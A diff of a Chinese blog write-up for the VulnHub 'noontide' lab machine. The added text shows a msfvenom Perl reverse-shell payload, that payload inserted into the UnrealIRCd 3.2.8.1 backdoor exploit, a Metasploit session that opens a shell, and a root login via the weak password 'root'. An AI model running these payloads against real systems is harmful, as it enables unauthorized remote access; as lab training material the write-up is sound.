@@ -26,7 +26,7 @@
 <meta property="og:image" content="https://i3eg1nner.github.io/pic/40213028a320339d58cc4ae6d0aa91b0_MD5.png">
 <meta property="og:image" content="https://i3eg1nner.github.io/pic/62fca7764f5809837714c73f7a907ea5_MD5.png">
 <meta property="article:published_time" content="2023-10-09T13:09:02.000Z">
-<meta property="article:modified_time" content="2023-10-09T15:20:01.970Z">
+<meta property="article:modified_time" content="2023-10-11T03:04:21.349Z">
 <meta property="article:author" content="I3eg1nner">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://i3eg1nner.github.io/pic/40213028a320339d58cc4ae6d0aa91b0_MD5.png">
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.6k 字
+          6.8k 字
         
       </span>
     
@@ -233,7 +233,7 @@
         
         
         
-          47 分钟
+          57 分钟
         
       </span>
     
@@ -289,12 +289,20 @@
 <p><a target="_blank" rel="noopener" href="https://github.com/Yehnn/kali/blob/master/kali%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%BB%E5%87%BB/11%E6%94%BB%E5%87%BB%20Unreal%20Ircd%20%E6%9C%8D%E5%8A%A1.md">kali&#x2F;kali服务器攻击&#x2F;11攻击 Unreal Ircd 服务.md at master · Yehnn&#x2F;kali (github.com)</a></p>
 <p>大部分都是直接使用 msf 的</p>
 <p><img src="/pic/62fca7764f5809837714c73f7a907ea5_MD5.png" srcset="/img/loading.gif" lazyload></p>
-<p>不使用 msf 的话，exp 中的 pl 脚本直接运行有问题。还是用 msf 吧</p>
+<p>不使用 msf 的话，exp 中的 pl 脚本直接运行有问题。需要自己手动修改一下，替换为自己的 payload，这个技巧也在刚才链接的博客里有提到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_noontide]<br>└─$ msfvenom -p cmd/unix/reverse_perl LHOST=192.168.56.106 LPORT=443 -f raw<br>[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload<br>[-] No <span class="hljs-built_in">arch</span> selected, selecting <span class="hljs-built_in">arch</span>: cmd from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 232 bytes<br>perl -MIO -e <span class="hljs-string">&#x27;$p=fork;exit,if($p);foreach my $key(keys %ENV)&#123;if($ENV&#123;$key&#125;=~/(.*)/)&#123;$ENV&#123;$key&#125;=$1;&#125;&#125;$c=new IO::Socket::INET(PeerAddr,&quot;192.168.56.106:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;)&#123;if($_=~ /(.*)/)&#123;system $1;&#125;&#125;;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>接下来我们要观察原来 payload 的结构，看看如何将自己的 payload 加进去。首先是 payload 开头都有 <code>AB;</code> 这应该是必要的代码，接下来要注意引号问题，这里我们将生成的代码中的单引号用反斜线转义</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">my <span class="hljs-variable">$payload1</span> = <span class="hljs-string">&#x27;AB; perl -MIO -e \&#x27;</span><span class="hljs-variable">$p</span>=fork;<span class="hljs-built_in">exit</span>,<span class="hljs-keyword">if</span>(<span class="hljs-variable">$p</span>);foreach my <span class="hljs-variable">$key</span>(keys %ENV)&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$ENV</span>&#123;<span class="hljs-variable">$key</span>&#125;=~/(.*)/)&#123;<span class="hljs-variable">$ENV</span>&#123;<span class="hljs-variable">$key</span>&#125;=<span class="hljs-variable">$1</span>;&#125;&#125;<span class="hljs-variable">$c</span>=new IO::Socket::INET(PeerAddr,<span class="hljs-string">&quot;192.168.56.106:443&quot;</span>);STDIN-&gt;fdopen(<span class="hljs-variable">$c</span>,r);$~-&gt;fdopen(<span class="hljs-variable">$c</span>,w);<span class="hljs-keyword">while</span>(&lt;&gt;)&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_</span>=~ /(.*)/)&#123;system <span class="hljs-variable">$1</span>;&#125;&#125;;\<span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>亲测可以反弹 shell。用 msf 也试一下</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.56.150<br>RHOSTS =&gt; 192.168.56.150<br>msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; <span class="hljs-built_in">set</span> RPORT 6697<br>RPORT =&gt; 6697<br>msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; run<br><br>[-] 192.168.56.150:6697 - Exploit failed: A payload has not been selected.<br>[*] Exploit completed, but no session was created.<br></code></pre></td></tr></table></figure>
 
 <p>可以使用 <code>show payloads</code> 查看可用的 paylaod，我按照刚才链接的那篇文章中的方法，设置 payload 为 <code>cmd/unix/reverse_perl</code> ，并设置了LHOST</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; <span class="hljs-built_in">set</span> payload cmd/unix/reverse_perl<br>payload =&gt; cmd/unix/reverse_perl<br>msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.56.106<br>LHOST =&gt; 192.168.56.106<br>msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.56.106:4444 <br>[*] 192.168.56.150:6667 - Connected to 192.168.56.150:6667...<br>    :irc.foonet.com NOTICE AUTH :*** Looking up your hostname...<br>    :irc.foonet.com NOTICE AUTH :*** Couldn\<span class="hljs-string">&#x27;t resolve your hostname; using your IP address instead</span><br><span class="hljs-string">[*] 192.168.56.150:6667 - Sending backdoor command...</span><br><span class="hljs-string">   </span><br><span class="hljs-string">[*] Command shell session 1 opened (192.168.56.106:4444 -&gt; 192.168.56.150:51882) at 2023-10-09 07:31:46 -0400</span><br><span class="hljs-string"></span><br><span class="hljs-string">whoami</span><br><span class="hljs-string">server</span><br><span class="hljs-string">id</span><br><span class="hljs-string">uid=1000(server) gid=1000(server) groups=1000(server),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)</span><br><span class="hljs-string">uname -a</span><br><span class="hljs-string">Linux noontide 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br><span class="hljs-string">ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:91:a9:5b brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.150/24 brd 192.168.56.255 scope global dynamic enp0s3</span><br><span class="hljs-string">       valid_lft 595sec preferred_lft 595sec</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fe91:a95b/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">which python2</span><br><span class="hljs-string">which python3</span><br><span class="hljs-string">/usr/bin/python3</span><br><span class="hljs-string">python3 -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">server@noontide:~/irc/Unreal3.2$</span><br><span class="hljs-string">server@noontide:~/irc$ cd ..</span><br><span class="hljs-string">cd ..</span><br><span class="hljs-string">server@noontide:~$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">irc  local.txt</span><br><span class="hljs-string">server@noontide:~$ cat local.txt</span><br><span class="hljs-string">cat local.txt</span><br><span class="hljs-string">c53c08b5bf2b0801c5d0c24149826a6e</span><br></code></pre></td></tr></table></figure>
 
+<p>也可以使用下面的 Python 脚本来 Getshell，记得替换脚本中的LHOST</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor">Ranger11Danger&#x2F;UnrealIRCd-3.2.8.1-Backdoor: My backdoor script for a vulnerable version of UnrealIRCd (github.com)</a></p>
 <p>提权部分卡了好大一会，尝试了敏感文件、定时文件、SUID 文件、shadow 文件权限、Linpeas 收集信息</p>
 <h2 id="弱密码提权"><a href="#弱密码提权" class="headerlink" title="弱密码提权"></a>弱密码提权</h2><p>没想到，竟然直接 root 弱密码，没绷住</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">server@noontide:~/irc/Unreal3.2$ su<br>su<br>Password: root<br><br>root@noontide:/home/server/irc/Unreal3.2<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@noontide:~<span class="hljs-comment"># ls </span><br><span class="hljs-built_in">ls</span><br>proof.txt<br>root@noontide:~<span class="hljs-comment"># cat proof.txt</span><br><span class="hljs-built_in">cat</span> proof.txt<br>ab28c8ca8da1b9ffc2d702ac54221105<br><br>Thanks <span class="hljs-keyword">for</span> playing! - Felipe Winsnes (@whitecr0wz)<br>root@noontide:~<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:91:a9:5b brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.150/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 595sec preferred_lft 595sec<br>    inet6 fe80::a00:27ff:fe91:a95b/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@noontide:~<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux noontide 4.19.0-10-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br>root@noontide:~<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure>
@@ -317,6 +325,13 @@
         
   <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
   
+  
+    <span>></span>
+    
+  <a href="/categories/knowledge-database/vulnhub/" class="category-chain-item">vulnhub</a>
+  
+  
+
   
 
       </span>
@@ -379,6 +394,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2023/10/42e0d8744dc9.html" title="sunset_solstice 靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sunset_solstice 靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
